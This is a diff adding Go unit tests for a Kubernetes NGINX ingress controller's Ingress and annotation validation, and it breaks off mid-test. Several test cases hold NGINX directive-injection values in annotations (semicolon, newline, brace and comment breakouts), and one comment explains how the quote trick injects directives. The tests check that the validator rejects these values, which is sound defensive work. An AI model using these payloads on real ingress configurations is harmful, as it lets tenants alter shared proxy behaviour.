@@ -1,0 +1,7686 @@
+package k8s
+
+import (
+	"fmt"
+	"reflect"
+	"strings"
+	"testing"
+
+	"github.com/wx-one/wxingress/internal/configs"
+	v1 "k8s.io/api/core/v1"
+	networking "k8s.io/api/networking/v1"
+	meta_v1 "k8s.io/apimachinery/pkg/apis/meta/v1"
+	"k8s.io/apimachinery/pkg/util/validation/field"
+)
+
+// headerNameErrMsg is the reason reported for an invalid HTTP header name. Every
+// header-name surface shares it, because they all validate through
+// internal/validation.ValidateHeaderName, which returns the message from
+// k8svalidation.IsHTTPHeaderName verbatim. When the remaining header-name
+// sources are aligned and the wording becomes owned by internal/validation,
+// this constant is the only place these assertions need to change.
+const headerNameErrMsg = `a valid HTTP header must consist of alphanumeric characters or '-' (e.g. 'X-Header-Name', regex used for validation is '[-A-Za-z0-9]+')`
+
+func TestValidateIngress_WithValidPathRegexValuesForNGINXPlus(t *testing.T) {
+	t.Parallel()
+	tt := []struct {
+		name    string
+		ingress *networking.Ingress
+		isPlus  bool
+	}{
+		{
+			name: "case sensitive path regex",
+			ingress: &networking.Ingress{
+				ObjectMeta: meta_v1.ObjectMeta{
+					Annotations: map[string]string{
+						"nginx.org/path-regex": "case_sensitive",
+					},
+				},
+				Spec: networking.IngressSpec{
+					Rules: []networking.IngressRule{
+						{
+							Host: "example.com",
+						},
+					},
+				},
+			},
+			isPlus: true,
+		},
+		{
+			name: "case insensitive path regex",
+			ingress: &networking.Ingress{
+				ObjectMeta: meta_v1.ObjectMeta{
+					Annotations: map[string]string{
+						"nginx.org/path-regex": "case_insensitive",
+					},
+				},
+				Spec: networking.IngressSpec{
+					Rules: []networking.IngressRule{
+						{
+							Host: "example.com",
+						},
+					},
+				},
+			},
+			isPlus: true,
+		},
+		{
+			name: "exact path regex",
+			ingress: &networking.Ingress{
+				ObjectMeta: meta_v1.ObjectMeta{
+					Annotations: map[string]string{
+						"nginx.org/path-regex": "exact",
+					},
+				},
+				Spec: networking.IngressSpec{
+					Rules: []networking.IngressRule{
+						{
+							Host: "example.com",
+						},
+					},
+				},
+			},
+			isPlus: true,
+		},
+	}
+
+	for _, tc := range tt {
+		tc := tc
+		t.Run(tc.name, func(t *testing.T) {
+			t.Parallel()
+			allErrs := validateIngress(tc.ingress, tc.isPlus, false, false, false, false, false)
+			if len(allErrs) != 0 {
+				t.Errorf("want no errors, got %+v\n", allErrs)
+			}
+		})
+	}
+}
+
+func TestValidateIngress_WithValidPathRegexValuesForNGINX(t *testing.T) {
+	t.Parallel()
+	tt := []struct {
+		name    string
+		ingress *networking.Ingress
+		isPlus  bool
+	}{
+		{
+			name: "case sensitive path regex",
+			ingress: &networking.Ingress{
+				ObjectMeta: meta_v1.ObjectMeta{
+					Annotations: map[string]string{
+						"nginx.org/path-regex": "case_sensitive",
+					},
+				},
+				Spec: networking.IngressSpec{
+					Rules: []networking.IngressRule{
+						{
+							Host: "example.com",
+						},
+					},
+				},
+			},
+			isPlus: false,
+		},
+		{
+			name: "case insensitive path regex",
+			ingress: &networking.Ingress{
+				ObjectMeta: meta_v1.ObjectMeta{
+					Annotations: map[string]string{
+						"nginx.org/path-regex": "case_insensitive",
+					},
+				},
+				Spec: networking.IngressSpec{
+					Rules: []networking.IngressRule{
+						{
+							Host: "example.com",
+						},
+					},
+				},
+			},
+			isPlus: false,
+		},
+		{
+			name: "exact path regex",
+			ingress: &networking.Ingress{
+				ObjectMeta: meta_v1.ObjectMeta{
+					Annotations: map[string]string{
+						"nginx.org/path-regex": "exact",
+					},
+				},
+				Spec: networking.IngressSpec{
+					Rules: []networking.IngressRule{
+						{
+							Host: "example.com",
+						},
+					},
+				},
+			},
+			isPlus: false,
+		},
+	}
+
+	for _, tc := range tt {
+		tc := tc
+		t.Run(tc.name, func(t *testing.T) {
+			t.Parallel()
+			allErrs := validateIngress(tc.ingress, tc.isPlus, false, false, false, false, false)
+			if len(allErrs) != 0 {
+				t.Errorf("want no errors, got %+v\n", allErrs)
+			}
+		})
+	}
+}
+
+func TestValidateIngress_WithInvalidPathRegexValuesForNGINXPlus(t *testing.T) {
+	t.Parallel()
+
+	tt := []struct {
+		name    string
+		ingress *networking.Ingress
+		isPlus  bool
+	}{
+		{
+			name: "bogus not empty path regex string",
+			ingress: &networking.Ingress{
+				ObjectMeta: meta_v1.ObjectMeta{
+					Annotations: map[string]string{
+						"nginx.org/path-regex": "bogus",
+					},
+				},
+				Spec: networking.IngressSpec{
+					Rules: []networking.IngressRule{
+						{
+							Host: "example.com",
+						},
+					},
+				},
+			},
+			isPlus: true,
+		},
+		{
+			name: "bogus empty path regex string",
+			ingress: &networking.Ingress{
+				ObjectMeta: meta_v1.ObjectMeta{
+					Annotations: map[string]string{
+						"nginx.org/path-regex": "",
+					},
+				},
+				Spec: networking.IngressSpec{
+					Rules: []networking.IngressRule{
+						{
+							Host: "example.com",
+						},
+					},
+				},
+			},
+			isPlus: true,
+		},
+	}
+	for _, tc := range tt {
+		tc := tc
+		t.Run(tc.name, func(t *testing.T) {
+			t.Parallel()
+			allErrs := validateIngress(tc.ingress, tc.isPlus, false, false, false, false, false)
+			if len(allErrs) == 0 {
+				t.Error("want errors on invalid path regex values")
+			}
+			t.Log(allErrs)
+		})
+	}
+}
+
+func TestValidateIngress_WithInvalidPathRegexValuesForNGINX(t *testing.T) {
+	t.Parallel()
+
+	tt := []struct {
+		name    string
+		ingress *networking.Ingress
+		isPlus  bool
+	}{
+		{
+			name: "bogus not empty path regex string",
+			ingress: &networking.Ingress{
+				ObjectMeta: meta_v1.ObjectMeta{
+					Annotations: map[string]string{
+						"nginx.org/path-regex": "bogus",
+					},
+				},
+				Spec: networking.IngressSpec{
+					Rules: []networking.IngressRule{
+						{
+							Host: "example.com",
+						},
+					},
+				},
+			},
+			isPlus: false,
+		},
+		{
+			name: "bogus empty path regex string",
+			ingress: &networking.Ingress{
+				ObjectMeta: meta_v1.ObjectMeta{
+					Annotations: map[string]string{
+						"nginx.org/path-regex": "",
+					},
+				},
+				Spec: networking.IngressSpec{
+					Rules: []networking.IngressRule{
+						{
+							Host: "example.com",
+						},
+					},
+				},
+			},
+			isPlus: false,
+		},
+	}
+	for _, tc := range tt {
+		tc := tc
+		t.Run(tc.name, func(t *testing.T) {
+			t.Parallel()
+			allErrs := validateIngress(tc.ingress, tc.isPlus, false, false, false, false, false)
+			if len(allErrs) == 0 {
+				t.Error("want errors on invalid path regex values")
+			}
+			t.Log(allErrs)
+		})
+	}
+}
+
+func TestValidateIngress(t *testing.T) {
+	t.Parallel()
+	tests := []struct {
+		ing                   *networking.Ingress
+		isPlus                bool
+		appProtectEnabled     bool
+		appProtectDosEnabled  bool
+		allowEmptyIngressHost bool
+		expectedErrors        []string
+		msg                   string
+	}{
+		{
+			ing: &networking.Ingress{
+				Spec: networking.IngressSpec{
+					Rules: []networking.IngressRule{
+						{
+							Host: "example.com",
+						},
+					},
+				},
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			allowEmptyIngressHost: false,
+			expectedErrors:        nil,
+			msg:                   "valid input",
+		},
+		{
+			ing: &networking.Ingress{
+				ObjectMeta: meta_v1.ObjectMeta{
+					Annotations: map[string]string{
+						"nginx.org/mergeable-ingress-type": "invalid",
+					},
+				},
+				Spec: networking.IngressSpec{
+					Rules: []networking.IngressRule{
+						{
+							Host: "",
+						},
+					},
+				},
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			allowEmptyIngressHost: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/mergeable-ingress-type: Invalid value: "invalid": must be one of: 'master' or 'minion'`,
+				"spec.rules[0].host: Required value",
+			},
+			msg: "invalid ingress",
+		},
+		{
+			ing: &networking.Ingress{
+				ObjectMeta: meta_v1.ObjectMeta{
+					Annotations: map[string]string{
+						"nginx.org/mergeable-ingress-type": "master",
+					},
+				},
+				Spec: networking.IngressSpec{
+					Rules: []networking.IngressRule{
+						{
+							Host: "example.com",
+							IngressRuleValue: networking.IngressRuleValue{
+								HTTP: &networking.HTTPIngressRuleValue{
+									Paths: []networking.HTTPIngressPath{
+										{
+											Path: "/",
+											Backend: networking.IngressBackend{
+												Service: &networking.IngressServiceBackend{
+													Name: "test-svc",
+												},
+											},
+										},
+									},
+								},
+							},
+						},
+					},
+				},
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				"spec.rules[0].http.paths: Too many: 1: must have at most 0 items",
+			},
+			msg: "invalid master",
+		},
+		{
+			ing: &networking.Ingress{
+				ObjectMeta: meta_v1.ObjectMeta{
+					Annotations: map[string]string{
+						"nginx.org/mergeable-ingress-type": "minion",
+					},
+				},
+				Spec: networking.IngressSpec{
+					Rules: []networking.IngressRule{
+						{
+							Host:             "example.com",
+							IngressRuleValue: networking.IngressRuleValue{},
+						},
+					},
+				},
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				"spec.rules[0].http.paths: Required value: must include at least one path",
+			},
+			msg: "invalid minion",
+		},
+		{
+			ing: &networking.Ingress{
+				Spec: networking.IngressSpec{
+					Rules: []networking.IngressRule{{Host: ""}},
+				},
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			allowEmptyIngressHost: true,
+			expectedErrors:        nil,
+			msg:                   "valid hostless ingress when allowed",
+		},
+		{
+			ing: &networking.Ingress{
+				Spec: networking.IngressSpec{
+					TLS:   []networking.IngressTLS{{SecretName: "default-cert"}},
+					Rules: []networking.IngressRule{{Host: ""}},
+				},
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			allowEmptyIngressHost: true,
+			expectedErrors:        nil,
+			msg:                   "allow hostless tls without tls hosts",
+		},
+		{
+			ing: &networking.Ingress{
+				Spec: networking.IngressSpec{
+					TLS:   []networking.IngressTLS{{Hosts: []string{"cafe.example.com"}, SecretName: "named-cert"}},
+					Rules: []networking.IngressRule{{Host: "cafe.example.com"}, {Host: ""}},
+				},
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			allowEmptyIngressHost: true,
+			expectedErrors:        nil,
+			msg:                   "allow mixed named and empty hosts with named tls",
+		},
+		{
+			ing: &networking.Ingress{
+				Spec: networking.IngressSpec{
+					TLS:   []networking.IngressTLS{{Hosts: []string{""}, SecretName: "default-cert"}},
+					Rules: []networking.IngressRule{{Host: "cafe.example.com"}, {Host: ""}},
+				},
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			allowEmptyIngressHost: true,
+			expectedErrors: []string{
+				"spec.tls[0].hosts[0]: Forbidden: empty host is not allowed in tls.hosts; TLS for the default catch-all server is configured via the -default-server-tls-secret CLI flag",
+			},
+			msg: "reject mixed named and empty hosts with empty-host tls entry",
+		},
+		{
+			ing: &networking.Ingress{
+				ObjectMeta: meta_v1.ObjectMeta{
+					Annotations: map[string]string{
+						listenPortsAnnotation: "80,8080",
+					},
+				},
+				Spec: networking.IngressSpec{
+					Rules: []networking.IngressRule{{Host: ""}},
+				},
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			allowEmptyIngressHost: true,
+			expectedErrors: []string{
+				"annotations.nginx.org/listen-ports: Forbidden: annotation is not supported for hostless Ingress",
+			},
+			msg: "reject hostless listen ports",
+		},
+		{
+			ing: &networking.Ingress{
+				ObjectMeta: meta_v1.ObjectMeta{
+					Annotations: map[string]string{
+						listenPortsAnnotation: "80,8080",
+					},
+				},
+				Spec: networking.IngressSpec{
+					Rules: []networking.IngressRule{{Host: "cafe.example.com"}},
+				},
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			allowEmptyIngressHost: true,
+			expectedErrors:        nil,
+			msg:                   "allow listen ports for non-hostless ingress",
+		},
+		{
+			ing: &networking.Ingress{
+				ObjectMeta: meta_v1.ObjectMeta{
+					Annotations: map[string]string{
+						listenPortsAnnotation: "80,8080",
+					},
+				},
+				Spec: networking.IngressSpec{
+					Rules: []networking.IngressRule{{Host: "cafe.example.com"}, {Host: ""}},
+				},
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			allowEmptyIngressHost: true,
+			expectedErrors: []string{
+				"annotations.nginx.org/listen-ports: Forbidden: annotation is not supported for hostless Ingress",
+			},
+			msg: "reject hostless listen ports for mixed named and empty hosts",
+		},
+		{
+			ing: &networking.Ingress{
+				ObjectMeta: meta_v1.ObjectMeta{
+					Annotations: map[string]string{
+						hstsAnnotation:             "true",
+						proxyHideHeadersAnnotation: "Server",
+					},
+				},
+				Spec: networking.IngressSpec{
+					Rules: []networking.IngressRule{{Host: ""}},
+				},
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			allowEmptyIngressHost: true,
+			expectedErrors:        nil,
+			msg:                   "allow hostless overrideable defaults",
+		},
+		{
+			ing: &networking.Ingress{
+				ObjectMeta: meta_v1.ObjectMeta{
+					Annotations: map[string]string{
+						"nginx.org/mergeable-ingress-type": "master",
+					},
+				},
+				Spec: networking.IngressSpec{
+					Rules: []networking.IngressRule{
+						{
+							Host: "",
+						},
+					},
+				},
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			allowEmptyIngressHost: true,
+			expectedErrors:        nil,
+			msg:                   "valid hostless master ingress",
+		},
+		{
+			ing: &networking.Ingress{
+				ObjectMeta: meta_v1.ObjectMeta{
+					Annotations: map[string]string{
+						"nginx.org/mergeable-ingress-type": "minion",
+					},
+				},
+				Spec: networking.IngressSpec{
+					Rules: []networking.IngressRule{
+						{
+							Host:             "",
+							IngressRuleValue: networking.IngressRuleValue{},
+						},
+					},
+				},
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			allowEmptyIngressHost: true,
+			expectedErrors: []string{
+				"spec.rules[0].http.paths: Required value: must include at least one path",
+			},
+			msg: "hostless minion still requires paths",
+		},
+
+		// proxy-redirect cross-annotation pair validation tests
+		{
+			ing: &networking.Ingress{
+				ObjectMeta: meta_v1.ObjectMeta{
+					Annotations: map[string]string{
+						configs.ProxyRedirectFromAnnotation: "off",
+					},
+				},
+				Spec: networking.IngressSpec{
+					Rules: []networking.IngressRule{{Host: "cafe.example.com"}},
+				},
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid proxy-redirect-from 'off' without proxy-redirect-to",
+		},
+		{
+			ing: &networking.Ingress{
+				ObjectMeta: meta_v1.ObjectMeta{
+					Annotations: map[string]string{
+						configs.ProxyRedirectFromAnnotation: "default",
+					},
+				},
+				Spec: networking.IngressSpec{
+					Rules: []networking.IngressRule{{Host: "cafe.example.com"}},
+				},
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid proxy-redirect-from 'default' without proxy-redirect-to",
+		},
+		{
+			ing: &networking.Ingress{
+				ObjectMeta: meta_v1.ObjectMeta{
+					Annotations: map[string]string{
+						configs.ProxyRedirectFromAnnotation: "off",
+						configs.ProxyRedirectToAnnotation:   "http://cafe.example.com/coffee/",
+					},
+				},
+				Spec: networking.IngressSpec{
+					Rules: []networking.IngressRule{{Host: "cafe.example.com"}},
+				},
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-redirect-to: Invalid value: "": nginx.org/proxy-redirect-to cannot be set when nginx.org/proxy-redirect-from is "off"`,
+			},
+			msg: "invalid proxy-redirect-to set when proxy-redirect-from is 'off'",
+		},
+		{
+			ing: &networking.Ingress{
+				ObjectMeta: meta_v1.ObjectMeta{
+					Annotations: map[string]string{
+						configs.ProxyRedirectFromAnnotation: "default",
+						configs.ProxyRedirectToAnnotation:   "http://cafe.example.com/coffee/",
+					},
+				},
+				Spec: networking.IngressSpec{
+					Rules: []networking.IngressRule{{Host: "cafe.example.com"}},
+				},
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-redirect-to: Invalid value: "": nginx.org/proxy-redirect-to cannot be set when nginx.org/proxy-redirect-from is "default"`,
+			},
+			msg: "invalid proxy-redirect-to set when proxy-redirect-from is 'default'",
+		},
+		{
+			ing: &networking.Ingress{
+				ObjectMeta: meta_v1.ObjectMeta{
+					Annotations: map[string]string{
+						configs.ProxyRedirectFromAnnotation: "http://cafe.example.com/v1/",
+						configs.ProxyRedirectToAnnotation:   "http://cafe.example.com/coffee/",
+					},
+				},
+				Spec: networking.IngressSpec{
+					Rules: []networking.IngressRule{{Host: "cafe.example.com"}},
+				},
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid proxy-redirect-from and proxy-redirect-to both set",
+		},
+		{
+			ing: &networking.Ingress{
+				ObjectMeta: meta_v1.ObjectMeta{
+					Annotations: map[string]string{
+						configs.ProxyRedirectToAnnotation: "http://cafe.example.com/coffee/",
+					},
+				},
+				Spec: networking.IngressSpec{
+					Rules: []networking.IngressRule{{Host: "cafe.example.com"}},
+				},
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-redirect-to: Invalid value: "": nginx.org/proxy-redirect-to requires nginx.org/proxy-redirect-from to also be set`,
+			},
+			msg: "invalid proxy-redirect-to set without proxy-redirect-from",
+		},
+		{
+			ing: &networking.Ingress{
+				ObjectMeta: meta_v1.ObjectMeta{
+					Annotations: map[string]string{
+						configs.ProxyRedirectFromAnnotation: "http://cafe.example.com/v1/",
+					},
+				},
+				Spec: networking.IngressSpec{
+					Rules: []networking.IngressRule{{Host: "cafe.example.com"}},
+				},
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-redirect-from: Invalid value: "http://cafe.example.com/v1/": nginx.org/proxy-redirect-from with a URL or regex value requires nginx.org/proxy-redirect-to to also be set`,
+			},
+			msg: "invalid proxy-redirect-from URL without proxy-redirect-to",
+		},
+	}
+
+	for _, test := range tests {
+		allErrs := validateIngress(test.ing, test.isPlus, test.appProtectEnabled, test.appProtectDosEnabled, false, false, test.allowEmptyIngressHost)
+		assertion := assertErrors("validateIngress()", test.msg, allErrs, test.expectedErrors)
+		if assertion != "" {
+			t.Error(assertion)
+		}
+	}
+}
+
+func TestValidateIngress_DirectiveBreakoutAnnotations(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		name        string
+		annotations map[string]string
+		isPlus      bool
+		wantError   bool
+	}{
+		{
+			name:        "valid JWT token variable",
+			annotations: map[string]string{configs.JWTTokenAnnotation: "$cookie_auth_token"},
+			isPlus:      true,
+		},
+		{
+			name:        "JWT token variable with suffix",
+			annotations: map[string]string{configs.JWTTokenAnnotation: "$cookie_auth_token suffix"},
+			isPlus:      true,
+			wantError:   true,
+		},
+		{
+			name:        "JWT token variable with directive breakout",
+			annotations: map[string]string{configs.JWTTokenAnnotation: "$cookie_auth_token; return 200"},
+			isPlus:      true,
+			wantError:   true,
+		},
+		{
+			// NGINX compiles the auth_jwt token= argument as a complex value,
+			// which accepts the braced form as readily as the plain one.
+			name:        "valid JWT token braced variable",
+			annotations: map[string]string{configs.JWTTokenAnnotation: "${cookie_auth_token}"},
+			isPlus:      true,
+		},
+		{
+			name:        "JWT token braced variable with directive breakout",
+			annotations: map[string]string{configs.JWTTokenAnnotation: "${cookie_auth_token}; return 200"},
+			isPlus:      true,
+			wantError:   true,
+		},
+		{
+			name:        "JWT token unterminated brace",
+			annotations: map[string]string{configs.JWTTokenAnnotation: "${cookie_auth_token"},
+			isPlus:      true,
+			wantError:   true,
+		},
+		{
+			name:        "JWT token braced variable with invalid name",
+			annotations: map[string]string{configs.JWTTokenAnnotation: "${cookie-auth-token}"},
+			isPlus:      true,
+			wantError:   true,
+		},
+		{
+			name:        "JWT token two variables",
+			annotations: map[string]string{configs.JWTTokenAnnotation: "${http_token}$cookie_auth_token"},
+			isPlus:      true,
+			wantError:   true,
+		},
+		{
+			name:        "valid hash with composite variable key",
+			annotations: map[string]string{lbMethodAnnotation: "hash $scheme$request_uri consistent"},
+		},
+		{
+			name:        "hash key with tab",
+			annotations: map[string]string{lbMethodAnnotation: "hash $request_uri\tconsistent"},
+			wantError:   true,
+		},
+		{
+			name:        "hash key with newline breakout",
+			annotations: map[string]string{lbMethodAnnotation: "hash $request_uri\nleast_conn"},
+			wantError:   true,
+		},
+		{
+			name:        "hash key with directive breakout",
+			annotations: map[string]string{lbMethodAnnotation: "hash $request_uri;\nleast_conn"},
+			wantError:   true,
+		},
+		{
+			name: "valid sticky-cookie parameters",
+			annotations: map[string]string{
+				stickyCookieServicesAnnotation: "serviceName=coffee-svc srv_id expires=1h domain=.example.com httponly secure samesite=lax path=/coffee",
+			},
+		},
+		{
+			name: "sticky-cookie parameters with newline breakout",
+			annotations: map[string]string{
+				stickyCookieServicesAnnotation: "serviceName=coffee-svc srv_id expires=1h\nzone injected 1",
+			},
+			wantError: true,
+		},
+		{
+			name: "sticky-cookie parameters with block breakout",
+			annotations: map[string]string{
+				stickyCookieServicesAnnotation: "serviceName=coffee-svc srv_id path=/{",
+			},
+			wantError: true,
+		},
+		{
+			name: "sticky-cookie parameters with comment breakout",
+			annotations: map[string]string{
+				stickyCookieServicesAnnotation: "serviceName=coffee-svc srv_id path=/#comment",
+			},
+			wantError: true,
+		},
+		{
+			name: "valid rewrite URL",
+			annotations: map[string]string{
+				rewritesAnnotation: "serviceName=coffee-svc rewrite=/v1/items/coffee-beans",
+			},
+		},
+		{
+			name: "valid rewrite URL with literal quote",
+			annotations: map[string]string{
+				rewritesAnnotation: `serviceName=coffee-svc rewrite=/v1/"items`,
+			},
+		},
+		{
+			name: "rewrite URL with comment breakout",
+			annotations: map[string]string{
+				rewritesAnnotation: "serviceName=coffee-svc rewrite=/v1/#comment",
+			},
+			wantError: true,
+		},
+		{
+			name: "rewrite URL with backslash breakout",
+			annotations: map[string]string{
+				rewritesAnnotation: `serviceName=coffee-svc rewrite=/v1/\items`,
+			},
+			wantError: true,
+		},
+		{
+			name:        "valid rewrite target with captures and query",
+			annotations: map[string]string{rewriteTargetAnnotation: "/api/$1/$2?source=ingress"},
+		},
+		{
+			name:        "valid rewrite target with literal quote",
+			annotations: map[string]string{rewriteTargetAnnotation: `/api/"quoted`},
+		},
+		{
+			name:        "rewrite target with comment breakout",
+			annotations: map[string]string{rewriteTargetAnnotation: "/api/#comment"},
+			wantError:   true,
+		},
+		{
+			name:        "rewrite target with backslash breakout",
+			annotations: map[string]string{rewriteTargetAnnotation: `/api/\$1`},
+			wantError:   true,
+		},
+		{
+			name: "valid proxy-redirect URL pair",
+			annotations: map[string]string{
+				proxyRedirectFromAnnotation: "http://backend.example.com/v1/",
+				proxyRedirectToAnnotation:   "https://public.example.com/api/",
+			},
+		},
+		{
+			name: "valid proxy-redirect regex with captures",
+			annotations: map[string]string{
+				proxyRedirectFromAnnotation: `~^http://backend\.example\.com/v(\d+)/(.*)`,
+				proxyRedirectToAnnotation:   "https://public.example.com/v$1/$2",
+			},
+		},
+		{
+			name: "valid proxy-redirect source URL with literal quote",
+			annotations: map[string]string{
+				proxyRedirectFromAnnotation: `http://backend.example.com/"quoted`,
+				proxyRedirectToAnnotation:   "https://public.example.com/",
+			},
+		},
+		{
+			name: "proxy-redirect source URL with backslash breakout",
+			annotations: map[string]string{
+				proxyRedirectFromAnnotation: `http://backend.example.com/v1\`,
+				proxyRedirectToAnnotation:   "https://public.example.com/",
+			},
+			wantError: true,
+		},
+		{
+			name: "valid proxy-redirect replacement with literal quote",
+			annotations: map[string]string{
+				proxyRedirectFromAnnotation: "http://backend.example.com/",
+				proxyRedirectToAnnotation:   `https://public.example.com/"quoted`,
+			},
+		},
+		{
+			name: "proxy-redirect replacement with comment breakout",
+			annotations: map[string]string{
+				proxyRedirectFromAnnotation: "http://backend.example.com/",
+				proxyRedirectToAnnotation:   "https://public.example.com/#comment",
+			},
+			wantError: true,
+		},
+		{
+			name: "valid proxy-redirect replacement with escaped literal",
+			annotations: map[string]string{
+				proxyRedirectFromAnnotation: "http://backend.example.com/",
+				proxyRedirectToAnnotation:   `https://public.example.com/\$1`,
+			},
+		},
+	}
+
+	for _, test := range tests {
+		t.Run(test.name, func(t *testing.T) {
+			t.Parallel()
+
+			pathType := networking.PathTypePrefix
+			ing := &networking.Ingress{
+				ObjectMeta: meta_v1.ObjectMeta{Annotations: test.annotations},
+				Spec: networking.IngressSpec{
+					Rules: []networking.IngressRule{
+						{
+							Host: "cafe.example.com",
+							IngressRuleValue: networking.IngressRuleValue{
+								HTTP: &networking.HTTPIngressRuleValue{
+									Paths: []networking.HTTPIngressPath{
+										{
+											Path:     "/",
+											PathType: &pathType,
+											Backend: networking.IngressBackend{
+												Service: &networking.IngressServiceBackend{Name: "coffee-svc"},
+											},
+										},
+									},
+								},
+							},
+						},
+					},
+				},
+			}
+
+			errs := validateIngress(ing, test.isPlus, false, false, false, false, false)
+			if test.wantError && len(errs) == 0 {
+				t.Fatal("validateIngress() returned no error")
+			}
+			if !test.wantError && len(errs) != 0 {
+				t.Fatalf("validateIngress() returned unexpected errors: %v", errs)
+			}
+		})
+	}
+}
+
+func TestValidateNginxIngressAnnotations(t *testing.T) {
+	t.Parallel()
+	tests := []struct {
+		annotations          map[string]string
+		specServices         map[string]bool
+		isPlus               bool
+		appProtectEnabled    bool
+		appProtectDosEnabled bool
+		snippetsEnabled      bool
+		directiveAutoAdjust  bool
+		hostless             bool
+		expectedErrors       []string
+		msg                  string
+	}{
+		{
+			annotations:          map[string]string{},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid no annotations",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/lb-method":              "invalid_method",
+				"nginx.org/mergeable-ingress-type": "invalid",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/lb-method: Invalid value: "invalid_method": invalid load balancing method: "invalid_method"`,
+				`annotations.nginx.org/mergeable-ingress-type: Invalid value: "invalid": must be one of: 'master' or 'minion'`,
+			},
+			msg: "invalid multiple annotations messages in alphabetical order",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/mergeable-ingress-type": "master",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid input with master annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/mergeable-ingress-type": "minion",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid input with minion annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/mergeable-ingress-type": "",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				"annotations.nginx.org/mergeable-ingress-type: Required value",
+			},
+			msg: "invalid mergeable type annotation 1",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/mergeable-ingress-type": "abc",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/mergeable-ingress-type: Invalid value: "abc": must be one of: 'master' or 'minion'`,
+			},
+			msg: "invalid mergeable type annotation 2",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/lb-method": "random",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.org/lb-method annotation, nginx normal",
+		},
+		{
+			annotations: map[string]string{
+				// A quote after a braced variable is not at a token boundary,
+				// so NGINX reads one unquoted token and the semicolon
+				// terminates the hash directive, injecting the rest into the
+				// upstream block.
+				"nginx.org/lb-method": `hash ${a}";ip_hash;#" consistent`,
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/lb-method: Invalid value: "hash ${a}\";ip_hash;#\" consistent": invalid load balancing method: "hash ${a}\";ip_hash;#\" consistent": must not contain NGINX directive delimiters`,
+			},
+			msg: "invalid nginx.org/lb-method annotation, quote after braced variable",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/lb-method": "least_time header",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.org/lb-method annotation least_time header for nginx normal",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/lb-method": "least_time header;",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
